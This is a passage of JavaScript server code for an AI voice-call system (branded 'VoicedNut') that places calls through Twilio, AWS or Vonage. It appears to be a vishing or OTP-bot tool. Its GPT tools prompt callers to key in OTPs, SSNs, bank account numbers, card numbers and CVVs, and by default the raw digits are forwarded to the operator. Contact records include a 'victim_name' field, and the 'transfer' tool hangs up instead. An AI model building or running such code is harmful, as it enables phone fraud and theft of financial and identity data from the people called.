  defaultCollectDelayMs: 1200,
  fallbackToVoiceOnFailure: true,
  showRawDigitsLive:
    String(process.env.SHOW_RAW_DIGITS_LIVE || "true").toLowerCase() === "true",
  sendRawDigitsToUser:
    String(process.env.SEND_RAW_DIGITS_TO_USER || "true").toLowerCase() ===
    "true",
  minDtmfGapMs: 200,
  riskThresholds: {
    confirm: Number(process.env.DIGIT_RISK_CONFIRM || 0.55),
    dtmf_only: Number(process.env.DIGIT_RISK_DTMF_ONLY || 0.7),
    route_agent: Number(process.env.DIGIT_RISK_ROUTE_AGENT || 0.9),
  },
  smsFallbackEnabled:
    String(process.env.DIGIT_SMS_FALLBACK_ENABLED || "true").toLowerCase() ===
    "true",
  smsFallbackMinRetries: Number(
    process.env.DIGIT_SMS_FALLBACK_MIN_RETRIES || 2,
  ),
  healthThresholds: {
    degraded: Number(process.env.DIGIT_HEALTH_DEGRADED || 30),
    overloaded: Number(process.env.DIGIT_HEALTH_OVERLOADED || 60),
  },
  circuitBreaker: {
    windowMs: Number(process.env.DIGIT_BREAKER_WINDOW_MS || 60000),
    minSamples: Number(process.env.DIGIT_BREAKER_MIN_SAMPLES || 8),
    errorRate: Number(process.env.DIGIT_BREAKER_ERROR_RATE || 0.3),
    cooldownMs: Number(process.env.DIGIT_BREAKER_COOLDOWN_MS || 60000),
  },
};

function getDigitSystemHealth() {
  const active = callConfigurations.size;
  const thresholds = DIGIT_SETTINGS.healthThresholds || {};
  const status =
    active >= thresholds.overloaded
      ? "overloaded"
      : active >= thresholds.degraded
        ? "degraded"
        : "healthy";
  return { status, load: active };
}

// Built-in telephony function scripts to give GPT deterministic controls
const telephonyTools = [
  {
    type: "function",
    function: {
      name: "confirm_identity",
      description:
        "Log that the caller has been identity-verified (do not include the code) and proceed to the next step.",
      parameters: {
        type: "object",
        properties: {
          method: {
            type: "string",
            enum: ["otp", "pin", "knowledge", "other"],
            description: "Verification method used.",
          },
          note: {
            type: "string",
            description:
              "Brief note about what was confirmed (no sensitive values).",
          },
        },
        required: ["method"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "route_to_agent",
      description:
        "End the call politely (no transfer) when escalation is requested.",
      parameters: {
        type: "object",
        properties: {
          reason: {
            type: "string",
            description: "Short reason for the transfer.",
          },
          priority: {
            type: "string",
            enum: ["low", "normal", "high"],
            description: "Transfer priority if applicable.",
          },
        },
        required: ["reason"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "collect_digits",
      description:
        "Ask caller to enter digits on the keypad (e.g., OTP). Do not speak or repeat the digits.",
      parameters: {
        type: "object",
        properties: {
          prompt: {
            type: "string",
            description: "Short instruction to the caller.",
          },
          min_digits: {
            type: "integer",
            description: "Minimum digits expected.",
            minimum: 1,
          },
          max_digits: {
            type: "integer",
            description: "Maximum digits expected.",
            minimum: 1,
          },
          profile: {
            type: "string",
            enum: [
              "generic",
              "verification",
              "ssn",
              "dob",
              "routing_number",
              "account_number",
              "phone",
              "tax_id",
              "ein",
              "claim_number",
              "reservation_number",
              "ticket_number",
              "case_number",
              "account",
              "extension",
              "zip",
              "amount",
              "callback_confirm",
              "card_number",
              "cvv",
              "card_expiry",
            ],
            description: "Collection profile for downstream handling.",
          },
          confirmation_style: {
            type: "string",
            enum: ["none", "last4", "spoken_amount"],
            description:
              "How to confirm receipt (masked, spoken summary only).",
          },
          timeout_s: {
            type: "integer",
            description: "Timeout in seconds before reprompt.",
            minimum: 3,
          },
          max_retries: {
            type: "integer",
            description: "Number of retries before fallback.",
            minimum: 0,
          },
          end_call_on_success: {
            type: "boolean",
            description:
              "If false, keep the call active after digits are captured.",
          },
          allow_spoken_fallback: {
            type: "boolean",
            description: "If true, allow spoken fallback after keypad timeout.",
          },
          mask_for_gpt: {
            type: "boolean",
            description:
              "If true (default), mask digits before sending to GPT/transcripts.",
          },
          speak_confirmation: {
            type: "boolean",
            description:
              "If true, GPT can verbally confirm receipt (without echoing digits).",
          },
          allow_terminator: {
            type: "boolean",
            description:
              "If true, allow a terminator key (default #) to finish early.",
          },
          terminator_char: {
            type: "string",
            description:
              "Single key used to end entry when allow_terminator is true.",
          },
        },
        required: ["prompt", "min_digits", "max_digits"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "collect_multiple_digits",
      description:
        "Collect multiple digit profiles sequentially in a single call (e.g., card number, expiry, CVV, ZIP). Do not repeat digits.",
      parameters: {
        type: "object",
        properties: {
          steps: {
            type: "array",
            description: "Ordered list of digit collection steps.",
            items: {
              type: "object",
              properties: {
                prompt: {
                  type: "string",
                  description: "Short instruction to the caller.",
                },
                min_digits: {
                  type: "integer",
                  description: "Minimum digits expected.",
                  minimum: 1,
                },
                max_digits: {
                  type: "integer",
                  description: "Maximum digits expected.",
                  minimum: 1,
                },
                profile: {
                  type: "string",
                  enum: [
                    "generic",
                    "verification",
                    "ssn",
                    "dob",
                    "routing_number",
                    "account_number",
                    "phone",
                    "tax_id",
                    "ein",
                    "claim_number",
                    "reservation_number",
                    "ticket_number",
                    "case_number",
                    "account",
                    "extension",
                    "zip",
                    "amount",
                    "callback_confirm",
                    "card_number",
                    "cvv",
                    "card_expiry",
                  ],
                  description: "Collection profile for downstream handling.",
                },
                confirmation_style: {
                  type: "string",
                  enum: ["none", "last4", "spoken_amount"],
                  description:
                    "How to confirm receipt (masked, spoken summary only).",
                },
                timeout_s: {
                  type: "integer",
                  description: "Timeout in seconds before reprompt.",
                  minimum: 3,
                },
                max_retries: {
                  type: "integer",
                  description: "Number of retries before fallback.",
                  minimum: 0,
                },
                allow_spoken_fallback: {
                  type: "boolean",
                  description:
                    "If true, allow spoken fallback after keypad timeout.",
                },
                mask_for_gpt: {
                  type: "boolean",
                  description:
                    "If true (default), mask digits before sending to GPT/transcripts.",
                },
                speak_confirmation: {
                  type: "boolean",
                  description:
                    "If true, GPT can verbally confirm receipt (without echoing digits).",
                },
                allow_terminator: {
                  type: "boolean",
                  description:
                    "If true, allow a terminator key (default #) to finish early.",
                },
                terminator_char: {
                  type: "string",
                  description:
                    "Single key used to end entry when allow_terminator is true.",
                },
                end_call_on_success: {
                  type: "boolean",
                  description:
                    "If false, keep the call active after this step.",
                },
              },
              required: ["profile"],
            },
          },
          end_call_on_success: {
            type: "boolean",
            description:
              "If false, keep the call active after all steps are captured.",
          },
          completion_message: {
            type: "string",
            description:
              "Optional message to speak after the final step when not ending the call.",
          },
        },
        required: ["steps"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "play_disclosure",
      description:
        "Play or read a required disclosure to the caller. Keep it concise.",
      parameters: {
        type: "object",
        properties: {
          message: {
            type: "string",
            description: "Disclosure text to convey.",
          },
        },
        required: ["message"],
      },
    },
  },
];

function buildTelephonyImplementations(callSid, gptService = null) {
  return {
    confirm_identity: async (args = {}) => {
      const payload = {
        status: "acknowledged",
        method: args.method || "unspecified",
        note: args.note || "",
      };
      try {
        await db.updateCallState(callSid, "identity_confirmed", payload);
        webhookService.addLiveEvent(
          callSid,
          `✅ Identity confirmed (${payload.method})`,
          { force: true },
        );
      } catch (err) {
        console.error("confirm_identity handler error:", err);
      }
      return payload;
    },
    route_to_agent: async (args = {}) => {
      const payload = {
        status: "queued",
        reason: args.reason || "unspecified",
        priority: args.priority || "normal",
      };
      try {
        webhookService.addLiveEvent(
          callSid,
          `📞 Transfer requested (${payload.reason}) • ending call`,
          { force: true },
        );
        await speakAndEndCall(
          callSid,
          CALL_END_MESSAGES.failure,
          "transfer_requested",
        );
      } catch (err) {
        console.error("route_to_agent handler error:", err);
      }
      return payload;
    },
    collect_digits: async (args = {}) => {
      if (!digitService) {
        return { error: "Digit service not ready" };
      }
      return digitService.requestDigitCollection(callSid, args, gptService);
    },
    collect_multiple_digits: async (args = {}) => {
      if (!digitService) {
        return { error: "Digit service not ready" };
      }
      return digitService.requestDigitCollectionPlan(callSid, args, gptService);
    },
    play_disclosure: async (args = {}) => {
      const payload = { message: args.message || "" };
      try {
        await db.updateCallState(callSid, "disclosure_played", payload);
        webhookService.addLiveEvent(callSid, "📢 Disclosure played", {
          force: true,
        });
      } catch (err) {
        console.error("play_disclosure handler error:", err);
      }
      return payload;
    },
  };
}

function applyTelephonyTools(
  gptService,
  callSid,
  baseTools = [],
  baseImpl = {},
  options = {},
) {
  const allowTransfer = options.allowTransfer !== false;
  const allowDigitCollection = options.allowDigitCollection !== false;
  const normalizedName = (tool) =>
    String(tool?.function?.name || "")
      .trim()
      .toLowerCase();

  const filteredBaseTools = (Array.isArray(baseTools) ? baseTools : []).filter(
    (tool) => {
      const name = normalizedName(tool);
      if (!name) return false;
      if (
        !allowTransfer &&
        (name === "route_to_agent" || name === "transfercall")
      )
        return false;
      if (
        !allowDigitCollection &&
        (name === "collect_digits" || name === "collect_multiple_digits")
      )
        return false;
      return true;
    },
  );

  const filteredTelephonyTools = telephonyTools.filter((tool) => {
    const name = normalizedName(tool);
    if (!allowTransfer && name === "route_to_agent") return false;
    if (
      !allowDigitCollection &&
      (name === "collect_digits" || name === "collect_multiple_digits")
    )
      return false;
    return true;
  });

  const combinedTools = [...filteredBaseTools, ...filteredTelephonyTools];
  const combinedImpl = {
    ...baseImpl,
    ...buildTelephonyImplementations(callSid, gptService),
  };
  if (!allowTransfer) {
    delete combinedImpl.route_to_agent;
    delete combinedImpl.transferCall;
    delete combinedImpl.transfercall;
  }
  if (!allowDigitCollection) {
    delete combinedImpl.collect_digits;
    delete combinedImpl.collect_multiple_digits;
  }
  gptService.setDynamicFunctions(combinedTools, combinedImpl);
}

function getCallToolOptions(callConfig = {}) {
  const isDigitIntent = callConfig?.digit_intent?.mode === "dtmf";
  return {
    allowTransfer: isDigitIntent,
    allowDigitCollection: isDigitIntent,
  };
}

function configureCallTools(gptService, callSid, callConfig, functionSystem) {
  if (!gptService) return;
  const baseTools = functionSystem?.functions || [];
  const baseImpl = functionSystem?.implementations || {};
  const options = getCallToolOptions(callConfig);
  applyTelephonyTools(gptService, callSid, baseTools, baseImpl, options);
  if (
    !options.allowTransfer &&
    callConfig &&
    !callConfig.no_transfer_note_added
  ) {
    gptService.setCallIntent(
      "Constraint: do not transfer or escalate this call. Stay on the line and handle the customer end-to-end.",
    );
    callConfig.no_transfer_note_added = true;
    callConfigurations.set(callSid, callConfig);
  }
}

function formatDurationForSms(seconds) {
  if (!seconds || Number.isNaN(seconds)) return "";
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  if (mins === 0) {
    return `${secs}s`;
  }
  return `${mins}m ${secs}s`;
}

function normalizeCallStatus(value) {
  return String(value || "")
    .toLowerCase()
    .replace(/_/g, "-");
}

const STATUS_ORDER = [
  "queued",
  "initiated",
  "ringing",
  "answered",
  "in-progress",
  "completed",
  "voicemail",
  "busy",
  "no-answer",
  "failed",
  "canceled",
];
const TERMINAL_STATUSES = new Set([
  "completed",
  "voicemail",
  "busy",
  "no-answer",
  "failed",
  "canceled",
]);

function getStatusRank(status) {
  const normalized = normalizeCallStatus(status);
  return STATUS_ORDER.indexOf(normalized);
}

function isTerminalStatusKey(status) {
  return TERMINAL_STATUSES.has(normalizeCallStatus(status));
}

function shouldApplyStatusUpdate(previousStatus, nextStatus, options = {}) {
  const prev = normalizeCallStatus(previousStatus);
  const next = normalizeCallStatus(nextStatus);
  if (!next) return false;
  if (!prev) return true;
  if (prev === next) return true;
  if (isTerminalStatusKey(prev)) {
    if (
      options.allowTerminalUpgrade &&
      next === "completed" &&
      prev !== "completed"
    ) {
      return true;
    }
    return false;
  }
  const prevRank = getStatusRank(prev);
  const nextRank = getStatusRank(next);
  if (prevRank === -1 || nextRank === -1) return true;
  return nextRank >= prevRank;
}

function formatContactLabel(call) {
  if (call?.customer_name) return call.customer_name;
  if (call?.victim_name) return call.victim_name;
  const digits = String(call?.phone_number || call?.number || "").replace(
    /\D/g,
    "",
  );
  if (digits.length >= 4) {
    return `the contact ending ${digits.slice(-4)}`;
  }
  return "the contact";
}

function buildOutcomeSummary(call, status) {
  const label = formatContactLabel(call);
  switch (status) {
    case "no-answer":
      return `${label} didn't pick up the call.`;
    case "busy":
      return `${label}'s line was busy.`;
    case "failed":
      return `Call failed to reach ${label}.`;
    case "canceled":
      return `Call to ${label} was canceled.`;
    default:
      return "Call finished.";
  }
}

function buildRecapSmsBody(call) {
  const nameValue = call.customer_name || call.victim_name;
  const name = nameValue ? ` with ${nameValue}` : "";
  const normalizedStatus = normalizeCallStatus(
    call.status || call.twilio_status || "completed",
  );
  const status = normalizedStatus.replace(/_/g, " ");
  const duration = call.duration
    ? ` Duration: ${formatDurationForSms(call.duration)}.`
    : "";
  const rawSummary = (call.call_summary || "").replace(/\s+/g, " ").trim();
  const summary =
    normalizedStatus === "completed"
      ? rawSummary
        ? rawSummary.slice(0, 180)
        : "Call finished."
      : buildOutcomeSummary(call, normalizedStatus);
  return `VoicedNut call recap${name}: ${summary} Status: ${status}.${duration}`;
}

function buildRetrySmsBody(callRecord, callState) {
  const name =
    callState?.customer_name ||
    callState?.victim_name ||
    callRecord?.customer_name ||
    callRecord?.victim_name;
  const greeting = name ? `Hi ${name},` : "Hi,";
  return `${greeting} we tried to reach you by phone. When is a good time to call back?`;
}

function buildInboundSmsBody(callRecord, callState) {
  const name =
    callState?.customer_name ||
    callState?.victim_name ||
    callRecord?.customer_name ||
    callRecord?.victim_name;
  const greeting = name ? `Hi ${name},` : "Hi,";
  const business = callState?.business_id || callRecord?.business_id;
  const intro = business
    ? `Thanks for calling ${business}.`
    : "Thanks for calling.";
  return `${greeting} ${intro} Reply with your request and we will follow up shortly.`;
}

function buildCallbackPayload(callRecord, callState) {
  const prompt = callRecord?.prompt || DEFAULT_INBOUND_PROMPT;
  const firstMessage =
    callRecord?.first_message || DEFAULT_INBOUND_FIRST_MESSAGE;
  return {
    number: callRecord?.phone_number,
    prompt,
    first_message: firstMessage,
    user_chat_id: callRecord?.user_chat_id || null,
    customer_name:
      callState?.customer_name ||
      callState?.victim_name ||
      callRecord?.customer_name ||
      callRecord?.victim_name,
    business_id: callState?.business_id || callRecord?.business_id || null,
    script: callState?.script || callRecord?.script || null,
    script_id: callState?.script_id || callRecord?.script_id || null,
    purpose: callState?.purpose || callRecord?.purpose || null,
    emotion: callState?.emotion || callRecord?.emotion || null,
    urgency: callState?.urgency || callRecord?.urgency || null,
    technical_level:
      callState?.technical_level || callRecord?.technical_level || null,
    voice_model: callState?.voice_model || callRecord?.voice_model || null,
    collection_profile:
      callState?.collection_profile || callRecord?.collection_profile || null,
    collection_expected_length:
      callState?.collection_expected_length ||
      callRecord?.collection_expected_length ||
      null,
    collection_timeout_s:
      callState?.collection_timeout_s ||
      callRecord?.collection_timeout_s ||
      null,
    collection_max_retries:
      callState?.collection_max_retries ||
      callRecord?.collection_max_retries ||
      null,
    collection_mask_for_gpt:
      callState?.collection_mask_for_gpt || callRecord?.collection_mask_for_gpt,
    collection_speak_confirmation:
      callState?.collection_speak_confirmation ||
      callRecord?.collection_speak_confirmation,
  };
}

async function logConsoleAction(callSid, action, meta = {}) {
  if (!db || !callSid || !action) return;
  try {
    await db.updateCallState(callSid, "console_action", {
      action,
      at: new Date().toISOString(),
      ...meta,
    });
  } catch (error) {
    console.error("Failed to log console action:", error);
  }
}

const DIGIT_PROFILE_LABELS = {
  verification: "OTP",
  otp: "OTP",
  ssn: "SSN",
  dob: "DOB",
  routing_number: "Routing",
  account_number: "Account #",
  phone: "Phone",
  tax_id: "Tax ID",
  ein: "EIN",
  claim_number: "Claim",
  reservation_number: "Reservation",
  ticket_number: "Ticket",
  case_number: "Case",
  account: "Account",
  zip: "ZIP",
  extension: "Ext",
  amount: "Amount",
  callback_confirm: "Callback",
  card_number: "Card",
  cvv: "CVV",
  card_expiry: "Expiry",
  generic: "Digits",
};

function buildDigitSummary(digitEvents = []) {
  if (!Array.isArray(digitEvents) || digitEvents.length === 0) {
    return { summary: "", count: 0 };
  }

  const grouped = new Map();
  for (const event of digitEvents) {
    const profile = event.profile || "generic";
    if (!grouped.has(profile)) {
      grouped.set(profile, []);
    }
    grouped.get(profile).push(event);
  }

  const parts = [];
  let acceptedCount = 0;

  for (const [profile, events] of grouped.entries()) {
    const acceptedEvents = events.filter((e) => e.accepted);
    const chosen = acceptedEvents.length
      ? acceptedEvents[acceptedEvents.length - 1]
      : events[events.length - 1];
    const label = DIGIT_PROFILE_LABELS[profile] || profile;
    let value = chosen.digits || "";

    if (profile === "amount" && value) {
      const cents = Number(value);
      if (!Number.isNaN(cents)) {
        value = `$${(cents / 100).toFixed(2)}`;
      }
    }
    if (profile === "card_expiry" && value) {
      if (value.length === 4) {
        value = `${value.slice(0, 2)}/${value.slice(2)}`;
      } else if (value.length === 6) {
        value = `${value.slice(0, 2)}/${value.slice(2)}`;
      }
    }

    if (!value) {
      value = "none";
    }

    const suffix = chosen.accepted ? "" : " (unverified)";
    if (chosen.accepted) {
      acceptedCount += 1;
    }
    parts.push(`${label}: ${value}${suffix}`);
  }

  return {
    summary: parts.join(" • "),
    count: acceptedCount,
  };
}

function parseDigitEventMetadata(event = {}) {
  if (!event || event.metadata == null) return {};
  if (typeof event.metadata === "object") return event.metadata;
  try {
    return JSON.parse(event.metadata);
  } catch (_) {
    return {};
  }
}

function buildDigitFunnelStats(digitEvents = []) {
  if (!Array.isArray(digitEvents) || digitEvents.length === 0) {
    return null;
  }
  const steps = new Map();
  for (const event of digitEvents) {
    const meta = parseDigitEventMetadata(event);
    const stepKey = meta.plan_step_index
      ? String(meta.plan_step_index)
      : event.profile || "generic";
    const step = steps.get(stepKey) || {
      step: stepKey,
      label:
        meta.step_label ||
        DIGIT_PROFILE_LABELS[event.profile] ||
        event.profile ||
        "digits",
      plan_id: meta.plan_id || null,
      attempts: 0,
      accepted: 0,
      failed: 0,
      reasons: {},
    };
    step.attempts += 1;
    if (event.accepted) {
      step.accepted += 1;
    } else {
      step.failed += 1;
      const reason = event.reason || "invalid";
      step.reasons[reason] = (step.reasons[reason] || 0) + 1;
    }
    steps.set(stepKey, step);
  }
  const list = Array.from(steps.values());
  const topFailures = {};
  for (const step of list) {
    let topReason = null;
    let topCount = 0;
    for (const [reason, count] of Object.entries(step.reasons || {})) {
      if (count > topCount) {
        topReason = reason;
        topCount = count;
      }
    }
    if (topReason) {
      topFailures[step.step] = { reason: topReason, count: topCount };
    }
  }
  return { steps: list, topFailures };
}

function shouldCloseConversation(text = "") {
  const lower = String(text || "").toLowerCase();
  if (!lower) return false;
  return !!lower.match(
    /\b(thanks|thank you|bye|goodbye|appreciate|that.s all|that is all|have a good|bye bye)\b/,
  );
}

const ADMIN_HEADER_NAME = "x-admin-token";
const SUPPORTED_PROVIDERS = ["twilio", "aws", "vonage"];
let currentProvider = config.platform?.provider || "twilio";
let storedProvider = currentProvider;
const awsContactMap = new Map();
const vonageCallMap = new Map();

let awsConnectAdapter = null;
let awsTtsAdapter = null;
let vonageVoiceAdapter = null;

const builtinPersonas = [
  {
    id: "general",
    label: "General",
    description: "General voice call assistant",
    purposes: [{ id: "general", label: "General" }],
    default_purpose: "general",
    default_emotion: "neutral",
    default_urgency: "normal",
    default_technical_level: "general",
  },
];

function requireAdminToken(req, res, next) {
  const token = config.admin?.apiToken;
  if (!token) {
    return res
      .status(500)
      .json({ success: false, error: "Admin token not configured" });
  }
  const provided = req.headers[ADMIN_HEADER_NAME];
  if (!provided || provided !== token) {
    return res
      .status(403)
      .json({ success: false, error: "Admin token required" });
  }
  return next();
}

function hasAdminToken(req) {
  const token = config.admin?.apiToken;
  if (!token) return false;
  const provided = req.headers[ADMIN_HEADER_NAME];
  return Boolean(provided && provided === token);
}

function getProviderReadiness() {
  return {
    twilio: !!(
      config.twilio.accountSid &&
      config.twilio.authToken &&
      config.twilio.fromNumber
    ),
    aws: !!(config.aws.connect.instanceId && config.aws.connect.contactFlowId),
    vonage: !!(
      config.vonage.apiKey &&
      config.vonage.apiSecret &&
      config.vonage.applicationId &&
      config.vonage.privateKey
    ),
  };
}

function getProviderHealthEntry(provider) {
  if (!providerHealth.has(provider)) {
    providerHealth.set(provider, {
      errorTimestamps: [],
      degradedUntil: 0,
      lastErrorAt: null,
      lastSuccessAt: null,
    });
  }
  return providerHealth.get(provider);
}

function recordProviderError(provider, error) {
  const health = getProviderHealthEntry(provider);
  const windowMs = Number(config.providerFailover?.errorWindowMs) || 120000;
  const threshold = Number(config.providerFailover?.errorThreshold) || 3;
  const cooldownMs = Number(config.providerFailover?.cooldownMs) || 300000;
  const now = Date.now();
  health.errorTimestamps = health.errorTimestamps.filter(
    (ts) => now - ts <= windowMs,
  );
  health.errorTimestamps.push(now);
  health.lastErrorAt = new Date().toISOString();
  if (health.errorTimestamps.length >= threshold) {
    health.degradedUntil = now + cooldownMs;
    db?.logServiceHealth?.("provider_failover", "degraded", {
      provider,
      errors: health.errorTimestamps.length,
      window_ms: windowMs,
      cooldown_ms: cooldownMs,
      error: error?.message || String(error || "unknown"),
    }).catch(() => {});
  }
  providerHealth.set(provider, health);
}

function recordProviderSuccess(provider) {
  const health = getProviderHealthEntry(provider);
  health.errorTimestamps = [];
  health.lastSuccessAt = new Date().toISOString();
  if (health.degradedUntil && Date.now() > health.degradedUntil) {
    health.degradedUntil = 0;
  }
  providerHealth.set(provider, health);
}

function isProviderDegraded(provider) {
  const health = getProviderHealthEntry(provider);
  if (!health.degradedUntil) return false;
  if (Date.now() > health.degradedUntil) {
    health.degradedUntil = 0;
    providerHealth.set(provider, health);
    return false;
  }
  return true;
}

function getProviderOrder(preferred) {
  const order = [];
  if (preferred) order.push(preferred);
  for (const provider of SUPPORTED_PROVIDERS) {
    if (!order.includes(provider)) order.push(provider);
  }
  return order;
}

function selectOutboundProvider(preferred) {
  const readiness = getProviderReadiness();
  const failoverEnabled = config.providerFailover?.enabled !== false;
  const order = getProviderOrder(preferred);
  for (const provider of order) {
    if (!readiness[provider]) continue;
    if (!failoverEnabled) return provider;
    if (!isProviderDegraded(provider)) return provider;
  }
  return null;
}

let warnedMachineDetection = false;
function isMachineDetectionEnabled() {
  const value = String(config.twilio?.machineDetection || "").toLowerCase();
  if (!value) return false;
  if (["disable", "disabled", "off", "false", "0", "none"].includes(value))
    return false;
  return true;
}

function warnIfMachineDetectionDisabled(context = "") {
  if (warnedMachineDetection) return;
  if (currentProvider !== "twilio") return;
  if (isMachineDetectionEnabled()) return;
  const suffix = context ? ` (${context})` : "";
  console.warn(
    `⚠️ Twilio AMD is not enabled${suffix}. Voicemail detection may be unreliable. Set TWILIO_MACHINE_DETECTION=Enable.`,
  );
  warnedMachineDetection = true;
}

function getAwsConnectAdapter() {
  if (!awsConnectAdapter) {
    awsConnectAdapter = new AwsConnectAdapter(config.aws);
  }
  return awsConnectAdapter;
}

function getVonageVoiceAdapter() {
  if (!vonageVoiceAdapter) {
    vonageVoiceAdapter = new VonageVoiceAdapter(config.vonage);
  }
  return vonageVoiceAdapter;
}

function getAwsTtsAdapter() {
  if (!awsTtsAdapter) {
    awsTtsAdapter = new AwsTtsAdapter(config.aws);
  }
  return awsTtsAdapter;
}

async function endCallForProvider(callSid) {
  const callConfig = callConfigurations.get(callSid);
  const provider = callConfig?.provider || currentProvider;

  if (provider === "twilio") {
    const accountSid = config.twilio.accountSid;
    const authToken = config.twilio.authToken;
    if (!accountSid || !authToken) {
      throw new Error("Twilio credentials not configured");
    }
    const client = twilio(accountSid, authToken);
    await client.calls(callSid).update({ status: "completed" });
    return;
  }

  if (provider === "aws") {
    const contactId = callConfig?.provider_metadata?.contact_id;
    if (!contactId) {
      throw new Error("AWS contact id not available");
    }
    const awsAdapter = getAwsConnectAdapter();
    await awsAdapter.stopContact({ contactId });
    return;
  }

  if (provider === "vonage") {
    const callUuid = callConfig?.provider_metadata?.vonage_uuid || callSid;
    const vonageAdapter = getVonageVoiceAdapter();
    await vonageAdapter.hangupCall(callUuid);
    return;
  }

  throw new Error(`Unsupported provider ${provider}`);
}

async function connectInboundCall(callSid, hostOverride = null) {
  const callConfig = callConfigurations.get(callSid);
  const provider = callConfig?.provider || currentProvider;
  if (provider !== "twilio") {
    throw new Error("Inbound answer is only supported for Twilio");
  }
  const host = hostOverride || config.server?.hostname;
  if (!host) {
    throw new Error("Server hostname not configured");
  }
  const accountSid = config.twilio.accountSid;
  const authToken = config.twilio.authToken;
  if (!accountSid || !authToken) {
    throw new Error("Twilio credentials not configured");
  }
  const client = twilio(accountSid, authToken);
  const url = `https://${host}/incoming?answer=1`;
  await client.calls(callSid).update({ url, method: "POST" });
}

function estimateSpeechDurationMs(text = "") {
  const words = String(text || "")
    .trim()
    .split(/\s+/)
    .filter(Boolean).length;
  const baseMs = 1200;
  const perWordMs = 420;
  const estimated = baseMs + words * perWordMs;
  return Math.max(1600, Math.min(12000, estimated));
}

function startBackgroundWorkers() {
  if (backgroundWorkersStarted) return;
  backgroundWorkersStarted = true;

  setInterval(() => {
    smsService.processScheduledMessages().catch((error) => {
      console.error("❌ Scheduled SMS processing error:", error);
    });
  }, 60000); // Check every minute

  setInterval(() => {
    processCallJobs().catch((error) => {
      console.error("❌ Call job processor error:", error);
    });
  }, config.callJobs?.intervalMs || 5000);

  processCallJobs().catch((error) => {
    console.error("❌ Initial call job processor error:", error);
  });

  setInterval(() => {
    runStreamWatchdog().catch((error) => {
      console.error("❌ Stream watchdog error:", error);
    });
  }, STREAM_WATCHDOG_INTERVAL_MS);

  setInterval(() => {
    if (!emailService) {
      return;
    }
    emailService.processQueue({ limit: 10 }).catch((error) => {
      console.error("❌ Email queue processing error:", error);
    });
  }, config.email?.queueIntervalMs || 5000);

  setInterval(
    () => {
      smsService.cleanupOldConversations(24); // Keep conversations for 24 hours
    },
    60 * 60 * 1000,
  );
}

async function speakAndEndCall(callSid, message, reason = "completed") {
  if (!callSid || callEndLocks.has(callSid)) {
    return;
  }
  callEndLocks.set(callSid, true);
  clearSilenceTimer(callSid);
  if (digitService) {
    digitService.clearCallState(callSid);
  }

  const text = message || "Thank you for your time. Goodbye.";
  const callConfig = callConfigurations.get(callSid);
  const provider = callConfig?.provider || currentProvider;
  const session = activeCalls.get(callSid);
  if (session) {
    session.ending = true;
  }

  webhookService.addLiveEvent(callSid, `👋 Ending call (${reason})`, {
    force: true,
  });
  webhookService.setLiveCallPhase(callSid, "ending").catch(() => {});

  try {
    await db.addTranscript({
      call_sid: callSid,
      speaker: "ai",
      message: text,
      interaction_count: session?.interactionCount || 0,
      personality_used: "closing",
    });
    webhookService.recordTranscriptTurn(callSid, "agent", text);
  } catch (dbError) {
    console.error("Database error adding closing transcript:", dbError);
  }

  try {
    await db.updateCallState(callSid, "call_ending", {
      reason,
      message: text,
    });
  } catch (stateError) {
    console.error("Database error logging call ending:", stateError);
  }

  const delayMs = estimateSpeechDurationMs(text);

  if (provider === "aws") {
    try {
      const ttsAdapter = getAwsTtsAdapter();
      const voiceId = resolveVoiceModel(callConfig);
      const { key } = await ttsAdapter.synthesizeToS3(
        text,
        voiceId ? { voiceId } : {},
      );
      const contactId = callConfig?.provider_metadata?.contact_id;
      if (contactId) {
        const awsAdapter = getAwsConnectAdapter();
        await awsAdapter.enqueueAudioPlayback({ contactId, audioKey: key });
      }
      scheduleSpeechTicks(
        callSid,
        "agent_speaking",
        estimateSpeechDurationMs(text),
        0.5,
      );
    } catch (ttsError) {
      console.error("AWS closing TTS error:", ttsError);
    }
    setTimeout(() => {
      endCallForProvider(callSid).catch((err) =>
        console.error("End call error:", err),
      );
    }, delayMs);
    return;
  }

  if (provider === "twilio" && !session?.ttsService) {
    try {
      const accountSid = config.twilio.accountSid;
      const authToken = config.twilio.authToken;
      if (accountSid && authToken) {
        const response = new VoiceResponse();
        const sayVoice = resolveTwilioSayVoice(callConfig);
        if (sayVoice) {
          response.say({ voice: sayVoice }, text);
        } else {
          response.say(text);
        }
        response.hangup();
        const client = twilio(accountSid, authToken);
        await client.calls(callSid).update({ twiml: response.toString() });
        return;
      }
    } catch (twilioError) {
      console.error("Twilio closing update error:", twilioError);
    }
  }

  if (session?.ttsService) {
    try {
      await session.ttsService.generate(
        { partialResponseIndex: null, partialResponse: text },
        session?.interactionCount || 0,
      );
    } catch (ttsError) {
      console.error("Closing TTS error:", ttsError);
    }
  }

  setTimeout(() => {
    endCallForProvider(callSid).catch((err) =>
      console.error("End call error:", err),
    );
  }, delayMs);
}

async function recordCallStatus(callSid, status, notificationType, extra = {}) {
  if (!callSid) return;
  const call = await db.getCall(callSid).catch(() => null);
  const previousStatus = call?.status || call?.twilio_status;
  const normalizedStatus = normalizeCallStatus(status);
  const applyStatus = shouldApplyStatusUpdate(
    previousStatus,
    normalizedStatus,
    {
      allowTerminalUpgrade: normalizedStatus === "completed",
    },
  );
  const finalStatus = applyStatus
    ? normalizedStatus
    : normalizeCallStatus(previousStatus || normalizedStatus);
  await db.updateCallStatus(callSid, finalStatus, extra);
  if (applyStatus) {
    recordCallLifecycle(callSid, finalStatus, {
      source: "internal",
      raw_status: status,
      duration: extra?.duration,
    });
    if (isTerminalStatusKey(finalStatus)) {
      scheduleCallLifecycleCleanup(callSid);
    }
  }
  if (call?.user_chat_id && notificationType && applyStatus) {
    await db.createEnhancedWebhookNotification(
      callSid,
      notificationType,
      call.user_chat_id,
    );
  }
}

async function ensureAwsSession(callSid) {
  if (activeCalls.has(callSid)) {
    return activeCalls.get(callSid);
  }

  const callConfig = callConfigurations.get(callSid);
  const functionSystem = callFunctionSystems.get(callSid);
  if (!callConfig) {
    throw new Error(`Missing call configuration for ${callSid}`);
  }

  let gptService;
  if (functionSystem) {
    gptService = new EnhancedGptService(
      callConfig.prompt,
      callConfig.first_message,
    );
  } else {
    gptService = new EnhancedGptService(
      callConfig.prompt,
      callConfig.first_message,
    );
  }

  gptService.setCallSid(callSid);
  gptService.setCustomerName(
